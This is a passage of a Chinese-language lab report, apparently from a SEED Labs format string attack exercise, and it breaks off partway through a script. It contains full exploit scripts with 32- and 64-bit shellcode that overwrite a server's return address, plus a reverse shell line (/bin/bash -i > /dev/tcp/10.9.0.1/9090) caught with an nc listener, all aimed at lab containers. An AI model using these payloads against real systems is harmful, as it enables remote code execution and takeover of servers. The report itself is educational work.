class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(shellcode)               <span class="hljs-comment"># 将shellcode放置于buf的尾部</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><span class="hljs-comment">############################################################</span><br>buf_addr = <span class="hljs-number">0xffffd1df</span>	<span class="hljs-comment">#根据服务器输出The input buffer&#x27;s address得到输入的起始地址</span><br>ebp_addr = <span class="hljs-number">0xffffd118</span>	<span class="hljs-comment">#根据服务器输出Frame Pointer (inside myprintf)得到myprintf函数ebp的地址</span><br><br>shell_code_addr = buf_addr + <span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(shellcode) <span class="hljs-comment">#shellcode的入口地址</span><br>ret_addr = ebp_addr + <span class="hljs-number">0x4</span> <span class="hljs-comment">#myprint的返回地址所在的地址</span><br><br><span class="hljs-comment"># 目标：将ret_addr存储的值修改为shell_code_addr</span><br>high = (shell_code_addr&amp;<span class="hljs-number">0xffff0000</span>)&gt;&gt;<span class="hljs-number">16</span> <span class="hljs-comment">#shell_code_addr最高两个字节的值</span><br>low = shell_code_addr&amp;<span class="hljs-number">0x0000ffff</span> <span class="hljs-comment">#shell_code_addr最低两个字节的值</span><br><br><span class="hljs-comment"># 原则：先改变较小值对应的返回地址两字节的值</span><br>addr1 = ret_addr <span class="hljs-comment">#addr1：较小值对应的地址</span><br>small = low  <span class="hljs-comment">#small：较小值</span><br>addr2 = ret_addr + <span class="hljs-number">0x2</span> <span class="hljs-comment"># addr2：较大值对应的地址</span><br>large = high <span class="hljs-comment">#large：较大值</span><br><span class="hljs-keyword">if</span> high &lt; low :<br>	addr1 = ret_addr+<span class="hljs-number">0x2</span><br>	small = high<br>	addr2 = ret_addr<br>	large = low<br>	<br><span class="hljs-comment"># 格式化字符串开头：较小值对应地址的字节形式+“@@@@”+较大值对应地址的字节形式，共12个字符</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (addr1).to_bytes(<span class="hljs-number">4</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;@@@@&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (addr2).to_bytes(<span class="hljs-number">4</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># 需要63个%x使va_list移动至指向buf_addr，存储数值：较小值对应的地址</span><br><span class="hljs-comment"># 前62个%x的精度修饰符设置为4，第63个%x的精度修饰符大小为num1</span><br>num1 = small - <span class="hljs-number">12</span> - <span class="hljs-number">62</span>*<span class="hljs-number">8</span><br><span class="hljs-comment"># %.num2x使第二个%hn对应数值——已打印的字符数改变</span><br>num2 = large - small<br><br><span class="hljs-comment">#得到格式化字符串如下：</span><br>s = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num1) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num2) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span> + <span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
</li>
<li>
<p>由于当新建一个容器时，它的ebp和buf地址会发生变化。我们先通过以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">shell $ echo hello | nc 10.9.0.5 9090        <br>Press Ctrl+C<br></code></pre></div></td></tr></table></figure>
<p>得到<code>The input buffer's address</code>和<code>Frame Pointer (inside myprintf)</code>，按照这两个值修改<code>exploit.py</code>程序中的<code>buf_addr</code>和<code>ebp_addr</code>。<br>
<img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202105511104.png" srcset="/img/loading.gif" lazyload alt="image-20211202105511104"></p>
</li>
<li>
<p>执行程序<code>exploit.py</code>，得到<code>badfile</code>。<br>
<img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202102003621.png" srcset="/img/loading.gif" lazyload alt="image-20211202102003621"></p>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile</code>的内容。得到服务器打印出的内容。可以看到，服务器执行了shellcode中预置的命令。<br>
<img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202102052424.png" srcset="/img/loading.gif" lazyload alt="image-20211202102052424"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202105907665.png" srcset="/img/loading.gif" lazyload alt="image-20211202105907665"></p>
</li>
</ol>
<h4 id="获得反向shell-2">获得反向shell</h4>
<ol>
<li>
<p>使用<code>ifconfig -a</code> 查看攻击者服务器的ip地址。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110353971.png" srcset="/img/loading.gif" lazyload alt="image-20211202110353971"></p>
</li>
<li>
<p>将<code>exploit.py</code>中的<code>shellcode_32</code>更改（第9行）如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <span class="hljs-comment">#修改处</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br></code></pre></div></td></tr></table></figure>
</li>
<li>
<p>在攻击端使用<code>nc -nv -l 9090</code>对端口9090进行监听。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110559075.png" srcset="/img/loading.gif" lazyload alt="image-20211202110559075"></p>
</li>
<li>
<p>运行<code>exploit.py</code>，得到<code>badfile</code>。向服务器server-10.9.0.5提供输入，输入为<code>badfile</code>的内容。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110819562.png" srcset="/img/loading.gif" lazyload alt="image-20211202110819562"></p>
</li>
<li>
<p>在攻击端可以得到服务器server-10.9.0.5的shell：</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202111143735.png" srcset="/img/loading.gif" lazyload alt="image-20211202111143735"></p>
</li>
</ol>
<h2 id="7-任务5：攻击64位服务器程序">7 任务5：攻击64位服务器程序</h2>
<p>​		在前面的任务中，我们的目标服务器是32位程序。在本任务中，我们切换到64位服务器程序。我们的新目标是10.9.0.6，它运行64位版本的格式化程序。让我们首先向该服务器发送一条hello消息。我们将看到目标容器打印出以下消息。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> hello | nc 10.9.0.6 9090</span><br>Press Ctrl+C<br>// Printouts on the container’s console<br>server-10.9.0.6 | Got a connection from 10.9.0.1<br>server-10.9.0.6 | Starting format<br>server-10.9.0.6 | Input buffer (address): 0x00007fffffffe200<br>server-10.9.0.6 | The secret message’s address: 0x0000555555556008<br>server-10.9.0.6 | The target variable’s address: 0x0000555555558010<br>server-10.9.0.6 | Input size: 6<br>server-10.9.0.6 | Frame Pointer (inside myprintf): 0x00007fffffffe140<br>server-10.9.0.6 | The target variable’s value (before): 0x1122334455667788<br>server-10.9.0.6 | hello<br>server-10.9.0.6 | (ˆ_ˆ)(ˆ_ˆ) Returned from printf() (ˆ_ˆ)(ˆ_ˆ)<br>server-10.9.0.6 | The target variable’s value (after): 0x1122334455667788<br></code></pre></div></td></tr></table></figure>
<ul>
<li>可以看到帧指针和缓冲区地址的值变为8字节长（而不是32位程序中的4字节）。需要做的是构造有效负载以利用服务器的格式字符串漏洞。最终目标是在目标服务器上获得一个<code>root shell</code>。您需要使用64位版本的<code>shellcode</code>。</li>
</ul>
<h3 id="64-位地址带来的挑战">64 位地址带来的挑战</h3>
<p>​		x64 架构带来的一个挑战是地址中的零。 尽管 x64 架构支持 64 位地址空间，但只允许从 0x00 到 0x00007FFFFFFFFFFFF 的地址。 这意味着对于每个地址（8 个字节），最高的两个字节始终为00，对应Ascii码<code>\0</code>。 这会导致问题。</p>
<p>​		在攻击中，我们需要将地址放在格式字符串中。 对于 32 位程序，我们可以将地址放在任何地方，因为地址内没有00。 对于 64 位程序，我们不能再这样做了。 如果将地址放在格式字符串的中间，当 <code>printf()</code> 解析格式字符串时，它会在遇到<code>\0</code>时停止解析。 基本上，格式字符串中第一个<code>零</code>（<code>\0</code>）之后的任何内容都不会被视为格式字符串的一部分。<br>
​		<code>\0</code>引起的问题与缓冲区溢出攻击不同，在缓冲区溢出攻击中，如果使用 <code>strpcy()</code> ，<code>\0</code>将终止内存复制。 在这里，我们在程序中没有内存副本，因此我们可以在输入中使用零，但是将它们放在哪里很关键。</p>
<h3 id="一个有用的技巧：自由移动参数指针">一个有用的技巧：自由移动参数指针</h3>
<p>​		在格式字符串中，我们可以使用%x将参数指针 <code>va_list</code> 移动到下一个可选参数。 我们也可以直接将指针移动到第k个可选参数。这是使用格式字符串的参数字段（以 <code>k$</code> 的形式）完成的。 以下代码示例使用<code>%3$.20x</code>打印出第 3 个可选参数（数字 3）的值，然后使用<code>%6$n</code>将值写入第 6 个可选参数（变量 var，它的值将变为 20)。 最后，使用 <code>%2$.10x</code>，它将指针移回第二个可选参数（数字 2），并将其打印出来。 可以看到，使用这个方法，我们可以自由地来回移动指针。 此技术对于简化此任务中格式字符串的构造非常有用。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> var = <span class="hljs-number">1000</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$.20x%6$n%2$.10x\n&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, &amp;var);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value in var: %d\n&quot;</span>,var);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>----- Output ------<br>seed@ubuntu:$ a.out<br><span class="hljs-number">000000000000000000030000000002</span><br>The value in var: <span class="hljs-number">20</span><br></code></pre></div></td></tr></table></figure>
<h3 id="实验操作-8">实验操作</h3>
<ol>
<li>
<p>这里我准备将shellcode放在输入的尾部。目标是将将<code>myprintf</code>函数返回地址修改为shellcode的入口地址。这里使用%hn一次修改两字节的值，其中返回地址最高两字节的值0x0000无需改变。</p>
<p>因为在64位中shellcode的入口地址是包含0x00的。将地址转换为字节时，00对应的Ascii码为<code>\0</code>。当 <code>printf()</code>解析格式化字符串时，在遇到零（<code>\0</code>）后会停止解析，之后的任何内容都不会被视为格式化字符串的一部分。故<code>myprintf</code>函数返回地址的所在地址的高四字节和低四字节应该放在格式化字符串的后面。</p>
<p>故先用<code>%.numberx</code>修改已打印字符数，然后使用<code>%k$n</code>将指针移动到<code>printf()</code>的第k个参数，这个参数应为要修改的值的地址。</p>
</li>
<li>
<p>故格式化字符串的构成为：“%.<code>number1</code>x”、“%k1<code>$</code>hn”、“%.<code>number2</code>x”、“%k2<code>$</code>hn”、“%.<code>number3</code>x”、“%k3<code>$</code>hn”。</p>
</li>
<li>
<p>根据任务2.A的经验，可以得到输入的起始地址是<code>printf()</code>第34个参数的位置。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203173126917.png" srcset="/img/loading.gif" lazyload alt="image-20211203173126917"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203200540036.png" srcset="/img/loading.gif" lazyload alt="image-20211203200540036"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203200601940.png" srcset="/img/loading.gif" lazyload alt="image-20211203200601940"></p>
</li>
<li>
<p>关于k1、k2、k3的取值：</p>
<p>输入最多为1500个字节，故k1、k2、k3各自最多占3个字节。</p>
<p>number1、number2、number3的取值不会超过FFFFFFFF，即4294967295，各自最多占11个字节。</p>
<p>故整个格式化字符串最多为63个字节，占不到8个参数的长度。</p>
<p>对应地将<code>myprint</code>函数的返回地址的0-8位、8-16位、16-24位所在地址，按照数值shellcode的入口地址的0-8位、8-16位、16-24位数值从小到大的顺序放在第42、43和44个参数的位置（34+8=42），相对与输入起始地址的字节大小分别为64、72、80。</p>
<p>故k1=64，k2=72，k3=80。</p>
</li>
<li>
<p>类似于32位，我的<code>exploit.py</code>实现了自动化计算，每次使用只需修改两个服务器输出的地址<code>The input buffer's address</code>和<code>Frame Pointer (inside myprintf)</code>即可。<code>exploit.py</code>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)               <span class="hljs-comment"># 将shellcode放置于buf的尾部</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><span class="hljs-comment">############################################################</span><br>buf_addr = <span class="hljs-number">0x00007fffffffe4f0</span>	<span class="hljs-comment">#根据服务器输出The input buffer&#x27;s address得到输入的起始地址</span><br>ebp_addr = <span class="hljs-number">0x00007fffffffe430</span>	<span class="hljs-comment">#根据服务器输出Frame Pointer (inside myprintf)得到myprintf函数ebp的地址</span><br><br>shell_code_addr = buf_addr + <span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(shellcode) <span class="hljs-comment">#shellcode的入口地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%shell_code_addr)<br>ret_addr = ebp_addr + <span class="hljs-number">0x8</span> <span class="hljs-comment">#myprint返回地址所在的地址</span><br><br><span class="hljs-comment"># 目标：将ret_addr存储的值修改为shell_code_addr </span><br><br>a1 = shell_code_addr &amp; <span class="hljs-number">0x000000000000ffff</span> <span class="hljs-comment">#shell_code_addr的0-16位</span><br>a2 = (shell_code_addr &amp; <span class="hljs-number">0x00000000ffff0000</span>) &gt;&gt; <span class="hljs-number">16</span> <span class="hljs-comment">#shell_code_addr的16-32位</span><br>a3 = (shell_code_addr &amp; <span class="hljs-number">0x0000ffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-comment">#shell_code_addr的32-48位</span><br><br><span class="hljs-comment"># 构造列表按shell_code_addr每16位的大小，从小到大排序</span><br><span class="hljs-built_in">list</span>=[a1,a2,a3]<br><span class="hljs-built_in">list</span>.sort()<br><br><span class="hljs-comment">#构造shell_code_addr每16位对应myprint返回地址每16位所在的地址的字典</span><br>d=&#123;a1:ret_addr,a2:ret_addr+<span class="hljs-number">0x2</span>,a3:ret_addr+<span class="hljs-number">0x4</span>&#125;<br><br>num1 = <span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br>num2 = <span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>] - <span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br>num3 = <span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>] - <span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">#格式化字符串</span><br>s = <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num1) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%42$hn&quot;</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num2) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%43$hn&quot;</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num3) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%44$hn&quot;</span><br>fmt  = (s).encode(<span 